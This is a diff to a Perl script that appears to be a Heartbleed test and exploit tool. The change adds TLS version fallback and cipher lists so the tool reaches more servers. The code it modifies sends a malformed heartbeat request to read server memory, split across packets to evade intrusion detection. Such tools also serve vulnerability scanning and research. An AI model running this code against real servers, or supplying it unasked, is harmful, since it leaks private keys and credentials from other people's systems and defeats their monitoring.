@@ -22,7 +22,7 @@ my $timeout = 5;
 my $quiet = 0;
 my $show = 0;
 my $show_ascii = 0;
-my $ssl_version = 'tlsv1';
+my $ssl_version = 'auto';
 my @show_regex;
 my $heartbeats = 1;
 my $show_cert;
@@ -64,8 +64,9 @@ Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
                              parameter L specifies number of bytes per line (80)
   -R|--show-regex-match R  - show data matching perl regex R. Option can be
                              used multiple times
-  --ssl_version V          - specify SSL version to use, e.g. ssl3, tlsv1(default), 
-                             tlsv1_1, tlsv1_2
+  --ssl_version V          - specify SSL version to use, e.g. ssl3, tlsv1,
+                             tlsv1_1, tlsv1_2 or auto (default), which tries
+			     until it gets a server hello back
   -H|--heartbeats N        - number of heartbeats (default 1)
   -T|--timeout T           - use timeout (default 5)
 
@@ -117,7 +118,6 @@ GetOptions(
     'ssl_version=s' => \$ssl_version,
 );
 
-
 # use Net::SSLeay to print certificate information
 die "need Net::SSLeay to show certificate information"
     if $show_cert && ! eval { require Net::SSLeay };
@@ -129,7 +129,7 @@ $show_cert ||= ! $quiet && eval { require Net::SSLeay };
 $ssl_version = 
     lc($ssl_version) eq 'ssl3' ? 0x0300 :
     $ssl_version =~ m{^tlsv?1(?:_([12]))?}i ? 0x0301 + ($1||0) :
-    die "invalid SSL version: $ssl_version";
+    0; # try possible versions
 
 my $show_regex;
 if (@show_regex) {
@@ -142,41 +142,98 @@ if (@show_regex) {
 
 my $dst = shift(@ARGV) or usage("no destination given");
 $dst .= ":$default_port" if $dst !~ m{^([^:]+|.+\]):\w+$};
-my $cl = $INETCLASS->new(PeerAddr => $dst, Timeout => $timeout)
-    or die "failed to connect: $!";
 
-# disable NAGLE to send heartbeat with multiple small packets
-setsockopt($cl,6,1,pack("l",1));
+my $connect = sub {
+    my ($ssl_version,$ciphers) = @_;
 
-# skip plaintext before starting SSL handshake
-$starttls->($cl,$dst);
+    my $cl = $INETCLASS->new(
+	ref($dst) ? ( PeerAddr => $dst->[0], PeerPort => $dst->[1] ) 
+	    : ( PeerAddr => $dst ),
+	Timeout => $timeout
+    ) or die "failed to connect: $!";
+    # save dst to not resolve name every connect attempt
+    $dst = [ $cl->peerhost, $cl->peerport ] if ! ref($dst);
 
-# built and send ssl client hello
-my $hello_data = pack("nNn14Cn/a*C/a*n/a*",
-    $ssl_version,
-    time(),
-    ( map { rand(0x10000) } (1..14)),
-    0, # session-id length
-    pack("H*",'c009c00ac013c01400320038002f00350013000a000500ff'), # ciphers
-    "\0", # compression null
-    '',   # no extensions
-);
-$hello_data = substr(pack("N/a*",$hello_data),1); # 3byte length
-print $cl pack(
-    "Cnn/a*",0x16,$ssl_version,  # type handshake, version, length
-    pack("Ca*",1,$hello_data),   # type client hello, data
-);
+    # disable NAGLE to send heartbeat with multiple small packets
+    setsockopt($cl,6,1,pack("l",1));
+    # skip plaintext before starting SSL handshake
+    $starttls->($cl,$dst);
 
-my $use_version;
-my $err;
-while (1) {
-    my ($type,$ver,@msg) = _readframe($cl,\$err) or die "no reply ($err)";
-    if ( $type == 22 and grep { $_->[0] == 0x0e } @msg ) {
-	# server hello done
-	$use_version = $ver;
-	last;
+    # built and send ssl client hello
+    my $hello_data = pack("nNn14Cn/a*C/a*n/a*",
+	$ssl_version,
+	time(),
+	( map { rand(0x10000) } (1..14)),
+	0, # session-id length
+	pack("C*",@$ciphers),
+	"\0", # compression null
+	'',   # no extensions
+    );
+
+    $hello_data = substr(pack("N/a*",$hello_data),1); # 3byte length
+    print $cl pack(
+	"Cnn/a*",0x16,$ssl_version,  # type handshake, version, length
+	pack("Ca*",1,$hello_data),   # type client hello, data
+    );
+
+    my $use_version;
+    my $got_server_hello;
+    my $err;
+    while (1) {
+	my ($type,$ver,@msg) = _readframe($cl,\$err) or return;
+
+	# first message must be server hello
+	$got_server_hello ||= $type == 22 and grep { $_->[0] == 2 } @msg;
+	return if ! $got_server_hello;
+
+	# wait for server hello done
+	if ( $type == 22 and grep { $_->[0] == 0x0e } @msg ) {
+	    # server hello done
+	    $use_version = $ver;
+	    last;
+	}
     }
+
+    return ($cl,$use_version);
+};
+
+# these are the ciphers we try
+# that's all openssl -V ciphers reports with my openssl1.0.1
+my @ssl3_ciphers = (
+    0xC0,0x14,  0xC0,0x0A,  0xC0,0x22,  0xC0,0x21,  0x00,0x39,  0x00,0x38,
+    0x00,0x88,  0x00,0x87,  0xC0,0x0F,  0xC0,0x05,  0x00,0x35,  0x00,0x84,
+    0x00,0x8D,  0xC0,0x12,  0xC0,0x08,  0xC0,0x1C,  0xC0,0x1B,  0x00,0x16,
+    0x00,0x13,  0xC0,0x0D,  0xC0,0x03,  0x00,0x0A,  0x00,0x8B,  0xC0,0x13,
+    0xC0,0x09,  0xC0,0x1F,  0xC0,0x1E,  0x00,0x33,  0x00,0x32,  0x00,0x9A,
+    0x00,0x99,  0x00,0x45,  0x00,0x44,  0xC0,0x0E,  0xC0,0x04,  0x00,0x2F,
+    0x00,0x96,  0x00,0x41,  0x00,0x8C,  0xC0,0x11,  0xC0,0x07,  0xC0,0x0C,
+    0xC0,0x02,  0x00,0x05,  0x00,0x04,  0x00,0x8A,  0x00,0x15,  0x00,0x12,
+    0x00,0x09,  0x00,0x14,  0x00,0x11,  0x00,0x08,  0x00,0x06,  0x00,0x03,
+);
+my @tls12_ciphers = (
+    0xC0,0x30,  0xC0,0x2C,  0xC0,0x28,  0xC0,0x24,  0x00,0xA3,  0x00,0x9F,
+    0x00,0x6B,  0x00,0x6A,  0xC0,0x32,  0xC0,0x2E,  0xC0,0x2A,  0xC0,0x26,
+    0x00,0x9D,  0x00,0x3D,  0xC0,0x2F,  0xC0,0x2B,  0xC0,0x27,  0xC0,0x23,
+    0x00,0xA2,  0x00,0x9E,  0x00,0x67,  0x00,0x40,  0xC0,0x31,  0xC0,0x2D,
+    0xC0,0x29,  0xC0,0x25,  0x00,0x9C,  0x00,0x3C,
+);
+
+
+# try to connect and do ssl handshake either with the specified version or with
+# different versions (downgrade). Some servers just close if you start with
+# TLSv1.2 instead of replying with a lesser version
+my ($cl,$use_version);
+for my $ver ( $ssl_version ? $ssl_version : ( 0x303, 0x302, 0x301, 0x300 )) {
+    my @ciphers = (( $ver == 0x303 ? @tls12_ciphers : ()), @ssl3_ciphers );
+    ($cl,$use_version) = $connect->( $ver, \@ciphers ) and last;
+    verbose("failed to connect with version 0x%x",$ver);
 }
+# TODO: if everything fails we might have a F5 in front which cannot deal
+# with large client hellos.
+die "Failed to make a successful TLS handshake with peer.\n".
+    "Either peer does not talk SSL or sits behind some stupid SSL middlebox."
+    if ! $cl;
+
 # heartbeat request with wrong size
 # send in two packets to work around stupid IDS which try
 # to detect attack by matching packets only
@@ -189,6 +246,7 @@ for (1..$heartbeats) {
     print $cl substr($hb,1);
 }
 
+my $err;
 if ( my ($type,$ver,$buf) = _readframe($cl,\$err,1)) {
     if ( $type == 21 ) {
 	verbose("received alert (probably not vulnerable)");
@@ -424,3 +482,4 @@ sub _readlines {
     die "eof" if $buf eq '';
     die "unexpected response: $buf";
 }
+
